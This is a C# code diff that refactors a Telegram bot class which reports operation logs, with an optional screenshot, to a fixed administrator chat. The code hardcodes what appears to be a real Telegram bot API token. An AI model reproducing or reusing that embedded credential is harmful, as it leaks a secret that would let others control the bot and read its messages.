@@ -11,6 +11,7 @@ namespace OperLog
     {
         BackgroundWorker _bw;
         TelegramBotClient Bot = new Telegram.Bot.TelegramBotClient("1390500172:AAGZpceToZXEFcj1cAu7emYqp9APgKroxBw");
+        public const int adminID = 289675402;
         public void Main() {
             this._bw = new BackgroundWorker();
             this._bw.DoWork += Bot_Tg;
@@ -27,12 +28,16 @@ namespace OperLog
                     var update = evu.Update;
                     var message = update.Message;
                     if (message == null) return;
-                    if (message.Type == Telegram.Bot.Types.Enums.MessageType.Text) {
-                        if (message.Text == "/state") { 
-                            SendMessage(message.Chat.Id, "State: in progress");
-                        }
-                        if (message.Text == "/myid") { 
-                            SendMessage(message.Chat.Id, message.Chat.Id.ToString());
+                    if (message.Type == Telegram.Bot.Types.Enums.MessageType.Text)
+                    {
+                        switch (message.Text)
+                        {
+                            case "/state":
+                                SendMessage(message.Chat.Id, "State: in progress");
+                                break;
+                            case "/myid":
+                                SendMessage(message.Chat.Id, message.Chat.Id.ToString());
+                                break;
                         }
                     }
                 };
@@ -47,17 +52,17 @@ namespace OperLog
             await Bot.SendTextMessageAsync(id, text);
         }
 
-        public async void SendLog(string text,string path) {
+        public async void SendLog(string text,string picpath) {
             try {
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 |
                                                        SecurityProtocolType.Tls;
                 try {
-                    using (var fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read)) {
-                        await Bot.SendPhotoAsync(289675402, new InputOnlineFile(fileStream), text);
+                    using (var fileStream = new FileStream(picpath, FileMode.Open, FileAccess.Read, FileShare.Read)) {
+                        await Bot.SendPhotoAsync(adminID, new InputOnlineFile(fileStream), text);
                     }
                 }
                 catch {
-                    await Bot.SendTextMessageAsync(289675402, text);
+                    await Bot.SendTextMessageAsync(adminID, "No screen" + text);
                 }
             }
             catch (Telegram.Bot.Exceptions.ApiRequestException ex) {
